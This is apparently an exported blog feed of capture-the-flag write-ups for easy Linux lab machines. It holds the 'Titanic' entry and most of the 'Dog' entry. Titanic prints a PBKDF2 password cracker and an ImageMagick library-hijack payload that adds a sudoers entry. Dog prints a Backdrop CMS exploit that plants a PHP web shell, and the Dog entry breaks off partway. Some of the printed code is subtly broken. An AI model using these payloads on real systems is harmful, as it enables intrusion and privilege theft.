<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_31.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_32.png" alt="image.png" />
<br /><br />
wait a little bit to obtain root password
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_33.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_34.png" alt="image.png" />
<br /><br />
Machine pwned!!!</p>

<script src="/assets/js/matrix-overlay.js"></script>

<link rel="stylesheet" href="/assets/css/imagesstyle.css" />]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Cat]]></summary></entry><entry><title type="html">Titanic-Linux-Easy</title><link href="https://your-site-url/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html" rel="alternate" type="text/html" title="Titanic-Linux-Easy" /><published>2025-07-17T16:05:57+00:00</published><updated>2025-07-17T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html"><![CDATA[<h1 id="titanic">Titanic</h1>

<h1 id="1-enumeration">1. Enumeration</h1>
<p><br /><br />
Start enumerating ports
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image.png" alt="image.png" />
<br /><br />
A web application running on port 80, it is possible to book a trip
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_1.png" alt="image.png" />
<br /><br />
Then we can download the resume of the booking
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_2.png" alt="image.png" />
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_3.png" alt="image.png" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
There is no input sanitization at all, we can access another files performing path traversal attack
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_4.png" alt="image.png" />
<br /><br />
Easy to enumerate users, with a shell available
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_5.png" alt="image.png" />
<br /><br />
A really easy way to access the user flag using this information
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_6.png" alt="image.png" />
<br /><br />
This seems to be a unintended, anyways we need to do more steps further to gain a shell as this user, enumerate subdomains using FFUF
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_7.png" alt="image.png" />
<br /><br />
A version controlling is present in this subdomain
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_8.png" alt="image.png" />
<br /><br />
Check the compose file to find worthy paths
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_9.png" alt="image.png" />
<br /><br />
This is just a clue, the root gitea directory is disclosed, now we need to find a config file or a database, those are possible paths
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gitea</span><span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">gitea</span><span class="p">.</span><span class="n">db</span>
<span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">gitea</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">app</span><span class="p">.</span><span class="n">ini</span>
<span class="o">~/</span><span class="p">.</span><span class="n">gitea</span><span class="o">/</span><span class="n">custom</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">app</span><span class="p">.</span><span class="n">ini</span>
</code></pre></div></div>
<p><br /><br />
finally it is on <code class="language-plaintext highlighter-rouge">/home/developer/gitea/data/gitea/gitea.db</code>
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_10.png" alt="image.png" />
<br /><br />
There is a hash with this password hash algorithm (pbkdf2)
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_11.png" alt="image.png" />
<br /><br />
Search a little bit to be able to crack it using hashcat
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_12.png" alt="image.png" />
<br /><br />
Follow the previous instructions but don’t forget it is in hexadecimal format, we need to pass it from hex to its original bytes format, then we can encode it to base64
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_13.png" alt="image.png" />
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_14.png" alt="image.png" />
<br /><br />
Another way is using a python script, automating this process and avoiding using hashcat
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">binascii</span>

<span class="k">def</span> <span class="nf">create_pbkdf2hash</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">iterations</span><span class="p">,</span> <span class="n">dklen</span><span class="p">):</span>
	<span class="n">hash_gen</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">pbkdf2_hmac</span><span class="p">(</span><span class="s">'sha256'</span><span class="p">,</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">),</span> <span class="n">salt</span><span class="p">,</span> <span class="n">iterations</span><span class="p">,</span> <span class="n">dklen</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">hash_gen</span>

<span class="k">def</span> <span class="nf">crack_hash</span><span class="p">(</span><span class="n">dictionary_file</span><span class="p">,</span> <span class="n">target_hash</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">iterations</span><span class="o">=</span><span class="mi">50000</span><span class="p">,</span> <span class="n">dklen</span><span class="o">=</span><span class="mi">50</span><span class="p">):</span>
	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">dictionary_file</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
		<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
			<span class="n">password</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
			<span class="n">hash_value</span> <span class="o">=</span> <span class="n">create_pbkdf2hash</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">iterations</span><span class="p">,</span> <span class="n">dklen</span><span class="p">)</span>
			<span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
			<span class="k">if</span> <span class="n">hash_value</span> <span class="o">==</span> <span class="n">target_hash</span><span class="p">:</span>
				<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'password found: </span><span class="si">{</span><span class="n">line</span><span class="si">}</span><span class="s">, count </span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
		<span class="k">print</span><span class="p">(</span><span class="s">'Password not found'</span><span class="p">)</span>
		

<span class="n">salt</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">'salt'</span><span class="p">)</span>
<span class="n">target_hash</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">'hash'</span><span class="p">)</span>
<span class="n">dictionary_file</span> <span class="o">=</span> <span class="s">'/usr/share/wordlist/rockyou.txt'</span>
<span class="n">crack_hash</span><span class="p">(</span><span class="n">dictionary_file</span><span class="p">,</span> <span class="n">target_hash</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>
</code></pre></div></div>
<p><br /><br />
Then password is found and we can access as developer through ssh
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_15.png" alt="image.png" />
<br /><br /></p>
<h1 id="3priv-esc">3.Priv esc</h1>
<p><br /><br />
In opt there are some automation scripts, this takes every .jpg in a directory and it is passed to <code class="language-plaintext highlighter-rouge">magick</code> tool to identify every image
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_16.png" alt="image.png" />
<br /><br />
Checking it version we can see it is vulnerable to CVE-2024-41817, basically it is compiled by gcc, imagemagick is leaving some environment variables (LD_LIBRARY_PATH, MAGICK_COINFIGURE_PAHT) with insecure paths, if those paths do not exist, the tool will fallback using shared libraries present in the current directory
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_17.png" alt="image.png" />
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_18.png" alt="image.png" />
<br /><br />
We have control over the current directory where it is executing, use the POC to create a malicious shared library
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_19.png" alt="image.png" />
<br /><br />
Wait a little bit until it is compiled and get the root flag
<br /><br />
<img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_20.png" alt="image.png" />
<br /><br />
Another way to do it, giving a root shell to developer user
<br /><br /></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("echo 'developer ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers");
}
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> ./libxcb.so.1 a.c <span class="nt">-nostartfiles</span>
</code></pre></div></div>
<p><br /><br />
Machine pwned!!!@
<script src="/assets/js/matrix-overlay.js"></script></p>

<link rel="stylesheet" href="/assets/css/imagesstyle.css" />]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Titanic]]></summary></entry><entry><title type="html">Dog-Linux-Easy</title><link href="https://your-site-url/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html" rel="alternate" type="text/html" title="Dog-Linux-Easy" /><published>2025-07-17T16:05:57+00:00</published><updated>2025-07-17T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html"><![CDATA[<h1 id="dog">Dog</h1>

<h1 id="1-enumeration">1. Enumeration</h1>

<p>Start enumerating ports, there are only two open ports, check the web application at first instance
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image.png" alt="image.png" />
<br /><br />
A blog talking about dogs and their issues
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_1.png" alt="image.png" />
<br /><br />
We can login and reset password, but apparently we cannot register ourselves
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_2.png" alt="image.png" />
<br /><br />
It is powered by backdrop Content Management System which is open source written in php
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_3.png" alt="image.png" />
<br /><br />
We can see its repository on github, and perform a quick checking of access to files that we don’t suppose to, we even have access to <code class="language-plaintext highlighter-rouge">robots.txt</code> but not useful information were found in there
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_4.png" alt="image.png" />
<br /><br />
We have access to <code class="language-plaintext highlighter-rouge">.git</code> directory which means that we can extract full repository content from here
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_5.png" alt="image.png" />
<br /><br />
Without using tools yet we have got a username
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_6.png" alt="image.png" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
Using <code class="language-plaintext highlighter-rouge">git-dumper</code> we can extract all source code into a directory
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_7.png" alt="image.png" />
<br /><br />
We can perform a manual scanning review on configuration and settings file, where we found a password<br />
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_8.png" alt="image.png" />
<br /><br />
A hash salt is also present 
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_9.png" alt="image.png" />
<br /><br />
We need to find usernames in here, the first we found didn’t work, use the domain as filter to find <code class="language-plaintext highlighter-rouge">Tiffany</code>
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_10.png" alt="image.png" />
<br /><br />
Her email address is in an update settings file
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_11.png" alt="image.png" />
<br /><br />
Log in the graphical interface as Tiffany
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_12.png" alt="image.png" />
<br /><br />
We have a lot of users with “administrator” role in here
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_13.png" alt="image.png" />
<br /><br />
Until now, we haven’t found CMS version, use this same filter to find an authenticated Remote Code Execution
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_14.png" alt="image.png" />
<br /><br />
We have and exploit that creates a php reverse shell and a module.info file, packages them into a zip archive and install it as a module, Once installed the reverse can be triggered by simply sending a GET request to the file
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">zipfile</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">create_files</span><span class="p">():</span>
	<span class="n">info_content</span> <span class="o">=</span> <span class="s">"""
    type = module
    name = Block
    description = Controls the visual building blocks a page is constructed
    with. Blocks are boxes of content rendered into an area, or region, of a
    web page.
    package = Layouts
    tags[] = Blocks
    tags[] = Site Architecture
    version = BACKDROP_VERSION
    backdrop = 1.x

    configure = admin/structure/block

    ; Added by Backdrop CMS packaging script on 2024-03-07
    project = backdrop
    version = 1.27.1
    timestamp = 1709862662
    """</span>
    <span class="n">shell_info_path</span> <span class="o">=</span> <span class="s">"shell/shell.info"</span>
    <span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">shell_info_path</span><span class="p">),</span> <span class="n">exist_ok</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">shell_info_path</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
	    <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
	  
	  <span class="n">shell_content</span> <span class="o">=</span>  <span class="s">"""
    &lt;html&gt;
    &lt;body&gt;
    &lt;form method="GET" name="&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;"&gt;
    &lt;input type="TEXT" name="cmd" autofocus id="cmd" size="80"&gt;
    &lt;input type="SUBMIT" value="Execute"&gt;
    &lt;/form&gt;
    &lt;pre&gt;
    &lt;?php
    if(isset($_GET['cmd']))
    {
    system($_GET['cmd']);
    }
    ?&gt;
    &lt;/pre&gt;
    &lt;/body&gt;
    &lt;/html&gt;
    """</span>
    <span class="n">shell_php_path</span> <span class="o">=</span> <span class="s">"shell/shell.php"</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">shell_php_path</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
	    <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">shell_content</span><span class="p">)</span>
	  <span class="k">return</span> <span class="n">shell_info_path</span><span class="p">,</span> <span class="n">shell_php_path</span>

<span class="k">def</span> <span class="nf">create_zip</span><span class="p">(</span><span class="n">info_path</span><span class="p">,</span> <span class="n">php_path</span><span class="p">):</span>
	<span class="n">zip_filename</span> <span class="o">=</span> <span class="s">"shell.zip"</span>
	<span class="k">with</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">Zipfile</span><span class="p">(</span><span class="n">zip_filename</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
		<span class="n">zipf</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">info_path</span><span class="p">,</span> <span class="n">arcname</span><span class="o">=</span><span class="s">'shell/shell.info'</span><span class="p">)</span>
		<span class="n">zipf</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">php_path</span><span class="p">,</span> <span class="n">arcname</span><span class="o">=</span><span class="s">'shell/shell.php'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"Remote command execution exploit"</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"Evil module generating..."</span><span class="p">)</span>
	
	<span class="n">info_path</span><span class="p">,</span> <span class="n">php_path</span> <span class="o">=</span> <span class="n">create_files</span><span class="p">()</span>
	<span class="n">zip_filename</span> <span class="o">=</span> <span class="n">create_zip</span><span class="p">(</span><span class="n">info_path</span><span class="p">,</span> <span class="n">php_path</span><span class="p">)</span>
	
	<span class="k">print</span><span class="p">(</span><span class="s">"Evil module generated!"</span><span class="p">,</span> <span class="n">zip_filename</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"Go to "</span> <span class="o">+</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"/admin/modules/install and upload the "</span> <span class="o">+</span>
          <span class="n">zip_filename</span> <span class="o">+</span> <span class="s">" for Manual Installation."</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="s">"Your shell address:"</span><span class="p">,</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"/modules/shell/shell.php"</span><span class="p">)</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"Usage: python script.py [url]"</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_15.png" alt="image.png" />
<br /><br />
The zip file were generated and it indicates to go ourselves to install the module to be aware of what is happening. In this dashboard section we find a warning announcing that zip files are not allowed due to its extension is not loaded
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_16.png" alt="image.png" />
<br /><br />
Try with manual installation
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_17.png" alt="image.png" />
<br /><br />
Only <code class="language-plaintext highlighter-rouge">.tar.gz</code> files are allowed
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_18.png" alt="image.png" />
<br /><br />
Use the files that previously generated by the python script and transform them into the required compatible format
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_19.png" alt="image.png" />
<br /><br />
Once the installation is completed successfully
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_20.png" alt="image.png" />
<br /><br />
Access to the shell using the <code class="language-plaintext highlighter-rouge">cmd</code> variable, during enumeration of users with valid shells, we identify johncusack, further investigation revealed that this user reused Tiffany’s password, which allowed successful ssh authentication
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_21.png" alt="image.png" />
<br /><br /></p>
<h1 id="3priv-esc">3.Priv esc</h1>
<p><br /><br />
As johncusack user we can run as root bee binary
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_22.png" alt="image.png" />
<br /><br />
Basically this tool helps developers to automate tasks, execute code and access content efficiently in backdrop CMS
<br /><br />
